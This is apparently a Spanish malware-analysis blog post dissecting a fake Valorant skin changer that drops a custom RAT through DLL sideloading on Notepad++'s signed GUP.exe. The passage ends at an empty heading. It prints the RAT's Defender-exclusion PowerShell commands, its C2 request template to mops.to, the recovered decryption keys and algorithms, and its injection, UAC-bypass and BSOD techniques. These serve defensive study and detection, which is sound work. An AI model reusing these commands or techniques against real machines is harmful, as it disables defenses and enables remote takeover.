+++
author = "Andrés Del Cerro"
title = "Skins gratis y un RAT de regalo: anatomía del falso Valorant Skin Changer"
date = "2026-10-11T09:00:00+02:00"
description = "Análisis completo de un RAT privado multi-stage disfrazado de «skin changer» de Valorant: DLL sideloading sobre el GUP.exe firmado de Notepad++, tres capas de cifrado de cadenas, criptografía a medida, inyección en un cmd.exe suspendido y un C2 propio en mops.to:408."
tags = [
    "reverse-engineering",
    "malware-analysis",
    "rat",
    "dll-sideloading",
    "command-and-control",
    "valorant"
]
+++

# Skins gratis y un RAT de regalo: anatomía del falso «Valorant Skin Changer»

> **TL;DR.** Un falso «skin changer» de Valorant que se reparte por Google Sites esconde un **RAT privado multi-stage escrito a medida en C++**. Su lanzador es el **GUP.exe oficial y firmado de Notepad++** renombrado a `Client.exe`, que carga por **DLL sideloading** una `libcurl.dll` falsa. Esta descifra y ejecuta en memoria un stage-2 que se hace pasar por `RuntimeBroker.exe`, se instala en `C:\ProgramData`, se excluye de Windows Defender, persiste con tareas programadas falsas y llama a un C2 propio en **`mops.to:408`** mediante HTTP artesanal sobre sockets TCP. Si lo investigan o lo matan, provoca un **pantallazo azul** real.

*Fecha del análisis: 11 de octubre de 2026*
*Muestra: `/home/kali/Desktop/valorant-skin-changers/`*

---

## 1. Resumen ejecutivo

La muestra analizada es un **RAT (Remote Access Trojan) privado, multi-stage, escrito a medida en C++**, que se distribuye como un falso «skin changer» de Valorant a través de un sitio de Google Sites. El paquete incluye el **GUP.exe oficial y firmado de Notepad++ renombrado a `Client.exe`**, que actúa como lanzador legítimo para la técnica de **DLL sideloading**: al ejecutarlo, carga una `libcurl.dll` falsa que contiene el cargador malicioso.

El cargador descifra y ejecuta en memoria un segundo stage que se hace pasar por `RuntimeBroker.exe` (proceso legítimo de Windows), se instala en `C:\ProgramData\Windows\Microsoft\RuntimeBrokerA.exe`, desactiva Windows Defender para sus propias rutas, persiste mediante tareas programadas disfrazadas de servicios de Microsoft y se conecta a su servidor de control (**C2**) en **`mops.to`, puerto 408, mediante HTTP artesanal sobre sockets TCP crudos**.

El bot se identifica ante el C2 con el identificador **`7571078989`** y envía la huella de la máquina (HWID, versión de Windows, nombre de usuario, antivirus instalado). A partir de ahí, queda a la espera de **tareas remotas**: ejecución de comandos shell, descarga de payloads por fragmentos («chunks») e inyección de código en procesos legítimos, con capacidad de cierre de tareas y auto-actualización.

No se han encontrado tokens de Discord, Telegram ni ningún otro tipo de API key embebida: la exfiltración y el control ocurren única y exclusivamente contra la infraestructura propia del actor.

---

## 2. Ficha técnica de la muestra

| Fichero | Tamaño | SHA-256 | Veredicto |
|---|---|---|---|
| `Client.rar` | 115.848.097 | MD5 `63ec681ba7e6694c55fa5b99c3ae5536` | Empaquetador de distribución (contraseña: `3535`) |
| `Client/Client.exe` | 804.688 | `eaac64c113ebaba1fae924ad1b6239a44c8806bf2b85d8dc11a27ad65a981cc1` | **Legítimo**: GUP.exe oficial de Notepad++ (firmado), renombrado. Usado como lanzador |
| `Client/libcurl.dll` | 1.265.152 | `1aa245a0526450a76bfa127eddc986ff3c53b6bfb624787ea3f1a62f97672783` | **Malicioso**: cargador stage-1 (falsa libcurl) |
| `Client/gup.xml` | 4.608 | — | Configuración legítima del actualizador WinGup |
| `Client/NvMessageBus.dll` | 2.926.543 | `84ffd8dcf2efd4dc9d01663fa8aacc9c36564ae0fae288a93fcb42ccda14a32f` | **Señuelo**: DLL legítima de NVIDIA (32 bits, ~mar-2025), corrupta e inutilizable |
| `Client/data/Enumerate.cfg` | 10.056 | — | Prop del paquete falsificado (cifrado ajeno al malware) |
| `Client/data/GearDetectionEnumerate.cfg` | 420 | — | Prop del paquete falsificado |
| `Client/data/Lang.cfg` | 888 | — | Prop del paquete falsificado (BOM UTF-16 en claro) |
| `Client/data/Log/JPcd56xErJkLadWe` | 110.833.959 | — | Relleno/prop de alto valor entrópico; no referenciado por el código |
| `password.txt` | 147 | — | Nota del propio actor con la contraseña y el enlace de distribución |
| Stage-2 extraído (RuntimeBrokerA) | 534.528 | `a4cd739574d897c9620a1f33e1678c4a3bd481610d4790757a3684b3e1a608d9` | **Malicioso**: RAT final, descifrado durante este análisis |

**Fechas de compilación relevantes:**

- `libcurl.dll` (stage-1): **2 de octubre de 2026, 06:37:43 UTC**
- Stage-2 interno: **2 de octubre de 2026, 06:37:35 UTC** (mismo acto de compilación, 8 segundos antes)
- Dominio del C2 `mops.to`: creado el **27 de septiembre de 2026**, actualizado el **2 de octubre de 2026** (mismo día que la compilación del malware)

Esta cronología indica una infraestructura dedicada comprada/preparada específicamente para esta campaña, montada en las dos semanas previas al empaquetado de la muestra.

---

## 3. Punto de entrada y distribución

El fichero `password.txt` incluido en la carpeta de la víctima (posiblemente una nota del propio actor o un resto de su pipeline) delata el vector de distribución:

```
https://sites.google.com/view/v2-35/home?authuser=0

Client.rar:3535
```

Es decir:

1. La víctima llega a un **Google Sites** falso que promueve el «skin changer» de Valorant (suplantación típica de este nicho: los skins de Valorant son de pago y hay gran demanda de alternativas fraudulentas).
2. Descarga `Client.rar` (115 MB, para parecer un producto «gordo» y legítimo).
3. El RAR está protegido con contraseña (`3535`) para evadir el análisis automático de sandboxes, servicios de correo y motores antivirus que no prueban archivos con contraseña.
4. La víctima extrae y ejecuta `Client.exe`.

El elevado tamaño del RAR se explica por el fichero de relleno de 110 MB (`data/Log/JPcd56xErJkLadWe`): puro lastre para dar apariencia de producto real.

---

## 4. La cadena de infección (visión general)

```
Google Sites falso
        |
        v
Client.rar (contraseña 3535)
        |
        v
Client.exe ............................. GUP.exe oficial de Notepad++ (FIRMADO, intacto)
        |                                  - ejecutado por el usuario
        |                                  - busca libcurl.dll en su directorio
        v
libcurl.dll (FALSA) .................... Stage-1: cargador malicioso
        |                                  - DllMain: inicialización
        |                                  - exige permisos de administrador
        |                                  - excluye sus rutas de Windows Defender
        |                                  - reensambla + descifra el stage-2
        v
RuntimeBrokerA.exe (en memoria) ........ Stage-2: RAT
        |                                  - se hace pasar por RuntimeBroker.exe
        |                                  - se copia a C:\ProgramData\Windows\Microsoft\
        |                                  - persiste con tareas programadas falsas
        |                                  - anti-VM / anti-sandbox / BSOD
        v
mops.to:408 ............................ C2 (HTTP artesanal sobre TCP)
        |                                  - GET /task/7571078989
        |                                  - info;<HWID>;<Windows>;<usuario>;<7571078989>
        |                                  - createtask / closetask / update
        v
cmd.exe SUSPENDIDO + inyección ......... Ejecución de payloads descargados por chunks
```

---

## 5. Análisis stage por stage

### 5.1 Stage 0 — `Client.exe`: el lanzador firmado

`Client.exe` es literalmente el **GUP.exe (WinGup) oficial de Notepad++**, el binario del actualizador que Don Ho firma con certificado de DigiCert.

**Verificación criptográfica realizada durante este análisis** (librería `signify`):

```
firmas embebidas: 1
FIRMANTE: Notepad++ | Saint Cloud | Ile-de-France | FR
VERIFICACION: AuthenticodeVerificationResult.OK
```

- La firma Authenticode es **válida de extremo a extremo**: el digest del PE y la cadena de certificados contra el almacén de confianza del sistema son correctos. **Ni un solo byte fue modificado** tras la firma: si el GUP hubiera sido trojanizado, el digest habría fallado.
- No contiene overlay (el certificado termina exactamente al final del fichero).
- Sus strings y URLs son únicamente las legítimas de WinGup/Notepad++ y DigiCert.

La técnica de usar GUP.exe como lanzador de sideloading es un TTP público y documentado (lo empleó APT10 según FireEye, y existen reglas Sigma específicas de «Suspicious GUP Usage» para detectar GUP.exe ejecutado fuera de las carpetas de Notepad++).

**¿Por qué GUP?** Porque importa `curl_easy_init`, `curl_easy_setopt`, `curl_easy_perform` y `curl_easy_cleanup` desde `libcurl.dll` **en su tabla de imports**: basta con colocar una DLL maliciosa con esos exportes junto al ejecutable para que Windows la cargue en cuanto arranca, ejecutando su `DllMain` con la reputación del firmado de Notepad++ como coartada.

El `gup.xml` incluido apunta a la URL legítima de actualización de Notepad++ (`https://notepad-plus-plus.org/update/getDownloadUrl.php`) con `SilentMode=yes`: el falso curl hace que la comprobación de actualizaciones falle en silencio y la ventana del GUP nunca molesta a la víctima.

### 5.2 Stage 1 — `libcurl.dll`: el cargador empaquetado

La falsa `libcurl.dll` es un PE32+ x64 construido el 2 de octubre de 2026 con secciones de nombres aleatorios (`.f7f725`, `.6dc08e`, `.47f952`, `.389e69`) y ofuscación de aritmética booleana mixta (MBA) en todo el código. Señales inequívocas de que no es una curl real:

- Importa **únicamente KERNEL32.dll** (una curl real importa WS2_32, WLDAP32, etc.).
- No contiene ni una sola cadena «curl» en claro.
- Exporta la API de curl (`curl_easy_init`, `curl_easy_perform`...) como **puntales vacíos** que satisfacen los imports de GUP.

#### 5.2.1 El DllMain y el gate de administrador

El punto de entrada es minimalista:

```c
undefined8 entry(undefined8 param_1, int param_2)
{
  if (param_2 == 1) {          // DLL_PROCESS_ATTACH
    FUN_18000ee40();
  }
  return 1;
}
```

La inicialización descifra sus cadenas y carga las DLLs que usará más adelante (`urlmon.dll`, `wininet.dll`, `gdi32.dll`, `winmm.dll`, `shell32.dll`). El punto de control real llega cuando GUP llama a `curl_easy_init` (su primera llamada curl):

```c
undefined8 curl_easy_init(void)
{
  iVar1 = FUN_180010460();               // ¿es administrador?
  if (iVar1 == 0) {
    // descifra: "user32.dll", "MessageBoxA",
    //           "run with administrator rights", "Error"
    (*pFVar3)(0, local_48, local_58, 0x10);   // MessageBoxA(NULL, texto, "Error", MB_ICONERROR)
    ExitProcess(0);
  }
  FUN_180015920();                        // payload: desempaquetar y lanzar el stage-2
  return 0;
}
```

El gate usa `advapi32.dll` con `AllocateAndInitializeSid` + `CheckTokenMembership` (comprobación del SID del grupo Administradores). Si la víctima no ejecutó como administrador, la muestra lanza el mensaje *«run with administrator rights»* y muere sin ejecutar nada más: el RAT necesita elevación para sus tareas de evasión y persistencia.

#### 5.2.2 Evasión de Windows Defender antes de cualquier otra cosa

Lo **primero** que hace el stage-1 tras superar el gate es desactivar la protección para sus propias rutas (vía `cmd.exe /C` oculto, con CreateProcessA y `CREATE_NO_WINDOW`):

```
powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:TEMP"

powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData',
'C:\ProgramData\Windows\Microsoft','C:\ProgramData\Microsoft\Windows'"

gpupdate /force
```

Estas cadenas estaban cifradas en la sección `.6dc08e` del loader (cifrado XOR con clave de 16 bytes, ver sección 7). Obsérvese el detalle quirúrgico: **las rutas excluidas son exactamente las rutas donde el RAT va a instalarse** (`C:\ProgramData\Windows\Microsoft\` contiene a `RuntimeBrokerA.exe`). El `gpupdate /force` fuerza la aplicación inmediata de las exclusiones.

#### 5.2.3 El desempaquetado del stage-2 (el corazón del loader)

`FUN_180015920` realiza un desempaquetado en cuatro pasos que reconstruí por completo y repliqué fuera de línea con emulación (Unicorn):

1. **Reserva de buffers**: `VirtualAlloc(NULL, 0xB68AC, MEM_COMMIT, RW)` y `VirtualAlloc(NULL, 0xA0000, ...)`.
2. **Reensamblado**: `FUN_180040830` concatena **5 fragmentos cifrados** dispersos en la sección `.6dc08e` (en las direcciones virtuales `0x18007d9d0`, `0x1800a2220`, `0x1800c6a70`, `0x1800eb130` y `0x18010fa10`, de unos 150 KB cada uno; total `0xB686C` bytes). Fragmentar el payload evita firmas estáticas por contenido continuo.
3. **De-junking**: `FUN_180040980` recorre el blob con un patrón **copia 10 bytes / salta 4**: de cada grupo de 14 bytes solo 10 son datos, los otros 4 son relleno aleatorio. El resultado son `0x82600` bytes de payload real cifrado.
4. **Descifrado CTR**: `FUN_180001130` implementa un **cifrador de bloques de 64 bits diseñado a medida** (red Feistel con constante dorada 0x9E3779B1 y programación de clave de 32 bytes) usado en **modo CTR**: genera el flujo de clave `E(clave, contador)` con contador inicial `0x96E696FB_F46C49DE` y lo aplica con XOR por bloques de 8 bytes.

El resultado es un **PE x86-64 válido** (cabecera MZ intacta, 10 secciones) que se ejecuta en memoria por mapeo manual. Este análisis reprodujo íntegramente el proceso y extrajo el binario final (`stage2.bin`, SHA-256 `a4cd7395...`), lo que permitió analizar el RAT sin necesidad de ejecutarlo.

Un hallazgo curioso: tras reensamblar los 5 fragmentos, **queda un bloque inicial de ~133 KB de bytes aleatorios** en la sección (entropía 7,998) que **ninguna instrucción del malware referencia**. Es relleno del empaquetador, posiblemente para despistar herramientas de extracción de payloads.

### 5.3 Stage 2 — `RuntimeBrokerA`: el RAT

El PE extraído es un RAT de 534 KB compilado con MSVC cuyos metadatos de versión lo **disfrazan de un componente de Microsoft**:

```
CompanyName:     Microsoft Windows
FileDescription: Windows Runtime Library
InternalName:    RuntimeBroker
OriginalFilename: RuntimeBroker.exe
ProductName:     Network Adapter Service
FileVersion:     1.3.29972.367
```

`RuntimeBroker.exe` es un proceso legítimo de Windows: el disfraz está pensado para que en el Administrador de tareas el proceso no llame la atención.

#### 5.3.1 Ingeniería de cadenas: tres capas de cifrado de strings

El RAT protege sus cadenas con **tres mecanismos distintos** que tuve que revertir uno a uno:

**Capa A — sección `.strenc`:** una tabla de 16 cadenas cifradas (nombres de comandos del protocolo) con un descifrador tipo RC4 con S-box embebida en el código y **16 claves de 8 bytes** almacenadas en la propia sección (offsets 0xA0-0x120). Cadena y clave se emparejan por posición:

```
ntdll.dll | RtlSetProcessIsCritical | NtQueryInformationProcess | RtlInitUnicodeString |
cmd.exe /C  | _chunk_ | task; | task_id; | createtask | type; | version; | param; |
update | task_done; | closetask | task | unknown
```

**Capa B — cadenas en variables TLS (thread-local storage):** la enorme mayoría de las cadenas se descifran bajo demanda a buffers en el TLS del hilo. Cada «descriptor de acceso» descifra su cadena con un algoritmo por byte:

```
plain[i] = ROR8(cipher[i], (i % 7) + 1) XOR ((i * 13 + 0xA3) & 0xFF)
```

Es decir: rotación a la derecha de 1 a 7 bits (según la posición del byte) y XOR con una función lineal de la posición. **No hay clave**: el propio algoritmo es el secreto. Para las cadenas UTF-16 el descifrador usa únicamente el byte bajo de cada word (el alto es relleno).

Con esto recuperé la tabla completa de cadenas del RAT (~140 cadenas), que revela virtualmente todo su comportamiento (ver sección 13).

**Capa C — configuración global:** 13 cadenas de configuración se resuelven en una tabla de punteros en `.data` al arrancar, entre ellas las críticas:

| Config | Valor |
|---|---|
| Ruta de instalación | `C:\ProgramData\Windows\Microsoft\RuntimeBrokerA.exe` |
| **Host del C2** | `mops.to` |
| Puerto principal | `408` |
| Puerto de verificación | `406` |
| Identificador de bot | `7571078989` |
| Versión del protocolo | `1.0.0` |
| Comandos | `ready;`, `;version;`, `ping`, `pong`, `getinfo`, `info;`, `task` |

#### 5.3.2 Antianálisis: el bicho no es ninguna broma

El RAT despliega una de las suites anti-análisis más completas que he visto en un malware de nicho:

**Anti-VM / anti-sandbox** (enumeración de hardware y software de virtualización):
- Drivers y dispositivos: `VBoxMouse.sys`, `VBoxGuest.sys`, `VBoxSF.sys`, `VBoxVideo.sys`, `vboxdrv.sys`, `vmmouse.sys`, `vmhgfs.sys`, `vm3dmp.sys`, `vmci.sys`, `vmxnet.sys`, `qemupciserial.sys`, `qemupcivideo.sys`, `prl_boot.sys`, `prl_eth.sys`, `prl_fs.sys`, `xen.sys`, `xenfilt.sys`, `xenvbd.sys`...
- Rutas de dispositivos: `\\.\VBoxMiniRdrDN`, `\\.\HGFS`, `\\.\prl_usb_mouse`
- Puertas mágicas de CPU: `KVMKVMKVM`, `VMwareVMware`, `XenVMMXenVMM`, `VBoxVBoxVBox`, `QEMU`
- Adaptadores de pantalla virtuales: «VMware SVGA II/3D», «VirtualBox Graphics Adapter», «Hyper-V Video», «Parallels Display Adapter», «Citrix Indirect Display Adapter», «Microsoft Basic Render Driver», «Standard VGA Graphics Adapter», y modelos de GPU reales de referencia (Broadwell, EPYC, G6900) consultados vía `d3d9.dll!Direct3DCreate9`
- **Detección específica del sandbox ANY.RUN**: cadenas `anyrun` y `anyrun GPU` — el actor sabe que su muestra acabará ahí y quiere morir antes de mostrar comportamiento.

**Contramedidas activas:**
- **BSOD deliberado**: `RtlAdjustPrivilege` (SeShutdownPrivilege) + `NtRaiseHardError(0xC0000420, ..., 6, ...)` — provoca una pantalla azul real del sistema de la víctima.
- **Proceso crítico**: `RtlSetProcessIsCritical` — si alguien mata el proceso del RAT, Windows entero cae con pantallazo azul. Brillante defensa contra herramientas de limpieza manuales.
- **Parcheo de AMSI**: cadenas `amsi.dll` + `AmsiOpenSession` (invalidación de la interfaz de análisis de scripts para que PowerShell deje de reportar).
- Antidebug mediante comprobaciones de proceso/token.

**Enumeración del antivirus de la víctima** vía WMI, que se incluye en el reporte al C2:

```
ROOT\SecurityCenter2
ROOT\SecurityCenter
SELECT displayName FROM AntiVirusProduct
SELECT displayName FROM AntiSpywareProduct
```

#### 5.3.3 Persistencia

El RAT se copia a `C:\ProgramData\Windows\Microsoft\RuntimeBrokerA.exe` (recuérdese: la ruta está **excluida de Defender por el stage-1**) y crea persistencia mediante **tareas programadas con nombres y rutas que imitan tareas de mantenimiento de Microsoft**, elevándose por el moniker COM:

```
Elevation:Administrator!new:
GUID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
Duración: PT0S
```

Nombres de tareas observados en las cadenas cifradas:

```
SvcRestartTaskWindowsLoginsA
ProgramDataUpdateA
ScheduledDefA
MicrosoftUpdaterMachineCoreA
BootTrigger                          (disparador de arranque)
TimeRepetition                       (repetición periódica)
```

Rutas falsificadas de las tareas: `\Microsoft\Windows\SoftwareProtectionPlatform`, `\Microsoft\Windows\RegisterDeviceAccountChange`, `\Microsoft\Windows\EDP`, `\Microsoft\Location`, y la descripción camuflada *«Handles restoring settings from the cloud»*.

Además emplea un **mutex de única instancia** (`Global\RuntimeBrokerAdsA`) y ajusta privilegios con `LookupPrivilegeValueW`/`AdjustTokenPrivileges` (incluido `SeIncreaseQuotaPrivilege`).

---

## 6. El C2: `mops.to`

### 6.1 Infraestructura

| Atributo | Valor |
|---|---|
| Dominio | `mops.to` |
| Dirección actual | `45.91.202.47` |
| DNS | Cloudflare (`gloria.ns.cloudflare.com`, `vicky.ns.cloudflare.com`) |
| Registrador | Tonic (TLD `.to` de Tonga, barato y con whois privado de facto) |
| Fecha de alta | **27 de septiembre de 2026** (dos semanas antes del build) |
| Última actualización | **2 de octubre de 2026** (mismo día de la compilación de la muestra) |
| Estado al sondear | Vivo; responde `Access denied` a peticiones curl genéricas en el puerto 408 |

El dominio se registró específicamente para esta campaña y se retocó el mismo día en que el autor empaquetó la muestra: infraestructura dedicada, no compartida con otras operaciones.

### 6.2 Transporte: HTTP artesanal sobre TCP crudo

El RAT **no usa wininet ni winhttp**: resuelve dinámicamente la API de sockets de `ws2_32.dll` (`WSAStartup`, `getaddrinfo`, `socket`, `connect`, `send`, `recv`, `select`, `shutdown`, `closesocket`, `ioctlsocket`...) y escribe las peticiones HTTP **a mano** sobre el socket, byte a byte:

```
GET /task/7571078989 HTTP/1.1
Host: mops.to
User-Agent: <huella de la víctima>
Connection: close
```

La plantilla exacta (recuperada del cifrado TLS del binario) es:

```
GET /task/%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
```

El `User-Agent` no es un navegador: es la **identidad de la víctima**, construida por `FUN_140018dd0` a partir de la versión y edición de Windows y de componentes de hardware de la máquina. Esto significa que el operador ve cada petición con la etiqueta del equipo infectado.

Durante el sondeo activo del endpoint, una petición con User-Agent genérico (`curl/8.x`) recibe un **`Access denied`** inmediato, mientras que un socket crudo con un UA del patrón del bot (`Windows 10`) recibe **silencio absoluto** (conexión aceptada, ningún byte de respuesta): el panel filtra por la forma de la petición, probablemente por el contenido o estructura del User-Agent. Es un comportamiento de panel privado, no de un servidor web estándar.

### 6.3 Protocolo de aplicación (texto plano con separadores `;`)

Sobre ese transporte, el protocolo de comandos es una serie de mensajes de texto separados por punto y coma:

**Saludo / verificación del servidor** (puerto 406, protocolo crudo sin HTTP):
```
checkserver;00000;<nonce de 15 caracteres aleatorios>
```
El bot genera el nonce con un PRNG xorshift sembrado con `GetTickCount64 ^ rdtsc ^ parametro` y alfabeto alfanumérico de 62 símbolos. Si el servidor responde exactamente **8 bytes**, la verificación es correcta. (Curiosidad: el fichero señuelo de 110 MB del paquete, `JPcd56xErJkLadWe`, tiene exactamente la morfología de 15 caracteres que produce este generador.)

**Identificación (respuesta al comando `getinfo`):**
```
info;<HWID>;<versión de Windows>;<nombre de usuario>;<7571078989>
```

**Tareas (mensaje del servidor al bot):**
```
task;<id>;task_id;<tipo>;type;<X>;version;<Y>;param;<Z>
```

- `createtask`: ordena descargar y ejecutar un payload.
- `closetask`: cierra una tarea en ejecución.
- `param = update`: auto-actualización del bot.
- Respuestas del bot: `task_done;<tipo>`, `pong` (a `ping`, midiendo latencia con `GetTickCount64`), `ready;`.

---

## 7. Criptografía del malware (algoritmos y claves recuperadas)

Una parte sustancial del análisis consistió en revertir **todas** las capas criptográficas de la muestra. Todas son diseños a medida del autor (no hay AES ni RSA en ningún stage):

### 7.1 Cadenas del stage-1 (`libcurl.dll`)

XOR con clave repetida de 16 bytes, reiniciada al comienzo de cada cadena:

```
clave (en claro dentro de la propia sección cifrada, VA 0x18007d870):
0aad90ab10b91c391876a43826ad21c1
```

El «cifrado» de la función es en realidad solo `plain[i] = cipher[i] XOR clave[i % 16]`: la envoltura con aritmética booleana `((x ^ 0xFF) & 0x79 | x & 0x86)` se reduce algebraicamente a `x ^ 0x79`, cuyos efectos se cancelan en el XOR final. Una ofuscación que parece compleja y es trivial.

### 7.2 Payload del stage-1 (el blob de 5 fragmentos)

- Reensamblado de 5 fragmentos (~0xB686C bytes en total) desde `.6dc08e`.
- De-junking: se conservan 10 de cada 14 bytes.
- Descifrado: **cifrador de bloque de 64 bits propio en modo CTR**:

```
clave  (32 bytes, VA 0x18007d890): e143e7772b74424dcb44840b7ec54df47ac2e7ce62ca745c741a841568c271b3
contador inicial (VA 0x18007d880): 0x96E696FB_F46C49DE
flujo:  keystream = E(clave, contador++), XOR por bloques de 8 bytes
```

Este cifrador se replicó íntegramente por emulación (Unicorn Engine) sobre las funciones originales del binario, sin transcribir su código, y verificó produciendo una cabecera MZ válida y un PE completo.

### 7.3 Cadenas del stage-2 (RuntimeBrokerA)

Por byte, sin clave:

```
plain[i] = ROR8(cipher[i], (i % 7) + 1) XOR ((i * 13 + 0xA3) & 0xFF)
```

Para cadenas UTF-16: el mismo algoritmo sobre el byte bajo de cada word (el alto es relleno).

### 7.4 Sección `.strenc` del stage-2

Descifrador tipo RC4 con S-box de 296 bytes embebida como constantes en el código y 16 claves de 8 bytes en `.strenc+0xA0..0x120`, emparejadas por índice con sus cadenas.

### 7.5 Los ficheros `.cfg` y el «Log» de 110 MB: ajenos al malware

Se probaron contra estos ficheros **todos** los algoritmos y claves anteriores (XOR-16, CTR de 8 bytes, AES-ECB/CBC con las claves extraídas, ROR8+f(i)) y **ninguno los descifra**. Además, **ningún componente del malware contiene referencia alguna a `data\`, `Enumerate.cfg`, `Lang.cfg` o `Log`**. Los tres `.cfg` comparten los primeros 32 bytes de texto cifrado (cabecera común bajo un cifrado de flujo determinista con clave propia) y `Lang.cfg` antepone un BOM UTF-16 en claro.

**Conclusión:** los `.cfg` y el fichero de 110 MB son **atrezo del paquete falsificado** (pertenecen al «producto» que se está suplantando o son relleno plantado por el autor); su cifrado no forma parte del código del malware y su clave no reside en esta muestra. El nombre de 15 caracteres del «Log» imita la morfología del generador aleatorio del propio RAT (probablemente deliberado, como guiño de credibilidad), pero el generador solo se usa para el nonce de `checkserver`.

---

## 8. Capacidades del RAT (motor de tareas)

El motor de tareas se activa cuando el C2 envía un mensaje que empieza por `task;`. El análisis del parser y del ejecutor (`FUN_14001d7a0`, `FUN_14001d5e0`, `FUN_14001cbd0`) revela el repertorio completo:

### 8.1 `createtask` — descarga e inyección de payloads arbitrarios

Es la capacidad principal y la más peligrosa. El flujo, paso a paso:

1. **Descarga por fragmentos**: el bot solicita el payload al C2 con `GET /task/<nombre>` y lo recibe troceado. Los fragmentos se almacenan temporalmente con nombres `<nombre>_<tipo>_chunk_<n>` y se reensamblan en un buffer de hasta **3 MB**.
2. **Validación**: `FUN_140012f30` comprueba la integridad del ensamblado (posible capa adicional de cifrado/verificación de los payloads de pago).
3. **Inyección** (`FUN_14001c990`): crea un proceso **`C:\Windows\System32\cmd.exe` suspendido** (`CreateProcessA` con `CREATE_SUSPENDED | CREATE_NO_WINDOW`), espera 500 ms, inyecta el payload mediante las API nativas de ntdll (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) y reanuda el hilo principal con `ResumeThread`. Es un **process hollowing de libro**: en el Administrador de tareas se ve un `cmd.exe` legítimo ejecutando código del atacante. Si la inyección falla, mata el proceso y reintenta (hasta 2 veces).
4. **Registro**: cada tarea queda vinculada a su PID para poder cerrarla después.

Esto convierte a la muestra en un **descargador de cargas de pago**: el RAT en sí no roba credenciales, pero descarga y ejecuta en memoria cualquier cosa que el operador sirva desde `mops.to` (infostealer, ransomware, criptominero...). **El payload final no está en la muestra: lo distribuye el C2 bajo demanda.**

### 8.2 `closetask` — cierre de tareas

Busca el PID registrado de la tarea indicada, abre el proceso con `SYNCHRONIZE | PROCESS_TERMINATE`, lo mata con `TerminateProcess`, espera hasta 3 segundos y limpia el registro de tareas.

### 8.3 `update` — auto-actualización

Si el campo `param` de una tarea contiene `update`, el bot notifica `task_done;<tipo>` al C2 y llama a `ExitProcess`: se cierra para que la tarea de actualización (otro payload) lo sustituya en disco.

### 8.4 Ejecución de comandos shell

Función dedicada (`FUN_1400140c0`) que lanza:

```
cmd.exe /C <param>
```

con `CREATE_NO_WINDOW` (ventana oculta) y `WaitForSingleObject` hasta el fin del comando, devolviendo éxito/fallo. Es la misma vía que empleó el stage-1 para las exclusiones de Defender.

### 8.5 Telemetría

`ping`/`pong` con medida de latencia (`GetTickCount64`), `getinfo` con el reporte de huella, y `checkserver` contra el puerto 406.

---

## 9. Mapeo MITRE ATT&CK (síntesis)

| Técnica | Descripción en esta muestra |
|---|---|
| T1204.002 | Ejecución por el usuario del fichero descargado (Google Sites + RAR con contraseña) |
| T1574.002 | DLL sideloading: GUP.exe firmado + libcurl.dll maliciosa |
| T1036.005 | Suplantación de nombres: Client.exe (GUP), RuntimeBrokerA.exe (RuntimeBroker), tareas «Microsoft» |
| T1059.001 / T1059.003 | PowerShell y cmd.exe para evasión (`Add-MpPreference`, comandos) |
| T1562.001 | Deshabilitación de defensas: exclusiones de Defender + parcheo de AMSI |
| T1112 / T1547.005 | Persistencia: registro (`Software\WinRAR\Libs` como almacén de fragmentos) y tareas programadas |
| T1548.002 | Elevación vía moniker COM `Elevation:Administrator!new:` (bypass de UAC) |
| T1055 | Inyección de proceso: hollowing de cmd.exe suspendido con API nativa |
| T1105 | Transferencia de herramientas: descarga de payloads por chunks desde el C2 |
| T1497 | Evasión de virtualización/sandbox (VBox/VMware/QEMU/KVM/Hyper-V/Parallels/Citrix/ANY.RUN) |
| T1499-style (sabotaje) | BSOD deliberado (`NtRaiseHardError`) y `RtlSetProcessIsCritical` |
| T1082 / T1012 | Descubrimiento de sistema: HWID, versión de Windows, usuario, AV (WMI) |

---

## 10. Tokens, API keys y canales de terceros: búsqueda negativa

Se realizó un barrido exhaustivo con expresiones regulares específicas sobre **todos** los ficheros del paquete (`Client.exe`, `libcurl.dll`, `NvMessageBus.dll`, `gup.xml`, los tres `.cfg`, el Log de 110 MB, el RAR completo y el stage-2 descifrado), cubriendo:

- Tokens de Discord (`mfa.`, formato base64 de 3 partes, webhooks de `discord.com/api/webhooks`)
- Tokens de bot de Telegram (`\d{8,10}:AA...`) y llamadas a `api.telegram.org`
- Claves AWS (`AKIA...`), Google (`AIza...`), Slack (`xox...`)
- Claves privadas SSH (`-----BEGIN ... PRIVATE KEY-----`)
- URLs arbitrarias, IPs, blobs base64 largos

**Resultado: cero hallazgos en todos los ficheros.** La única «identidad» embebida en todo el paquete es:

```
Bot ID:      7571078989
C2:          mops.to:408 (TCP) / checkserver en 406
Version:     1.0.0
Distribucion: https://sites.google.com/view/v2-35/home
```

El modelo operativo del actor no depende de servicios de terceros (ni Discord, ni Telegram, ni pastebin): todo el control y la exfiltración de cargas pasan por su panel en `mops.to`. Esto es coherente con un RAT privado de nicho económico: probablemente monetiza vendiendo el «skin changer» (la muestra es el producto) y el RAT es la puerta trasera sobre sus propios clientes, o bien alquila la botnet.

---

## 11. Señuelos y detalles de atrezo

- **`NvMessageBus.dll`**: es una DLL **auténtica de NVIDIA** (32 bits, build ~marzo 2025, con protobuf 3.21.9 y rutas de compilación `C:\dvs\p4\build\sw\gcomp\dev\src\LocalServices\...`) que llegó **corrupta al paquete**: sufrió una conversión en modo texto (cada pareja CRLF perdió su CR y los bytes NUL se convirtieron en espacios 0x20), con desplazamiento acumulativo de bytes que la hace **imposible de cargar en Windows**. Nunca se ejecuta (nada la importa). Su única función es que la carpeta parezca un cliente gráfico serio («NVIDIA, message bus, configs, logs...»). Las cadenas de tokens de proceso que contiene (`OpenProcessToken`, `GetTokenInformation`, `ConvertSidToStringSidA`) pertenecen a su código legítimo de seguridad IPC de NVIDIA.
- **`data/Log/JPcd56xErJkLadWe`** (110 MB, entropía 7,98): lastre para inflar el RAR y dar realismo («los clientes serios tienen logs grandes»). Su nombre imita el generador aleatorio del propio RAT, pero el código del malware no crea ni lee esa ruta.
- **Marcadores del autor**: el par de constantes `32 a2 df 2d 99 2b` y `cd 5d 20 d2 66 d4 ff ff` aparece tanto en el stage-1 como en el stage-2: son la firma interna del autor y de su empaquetador.

---

## 12. Comparativa con familias conocidas

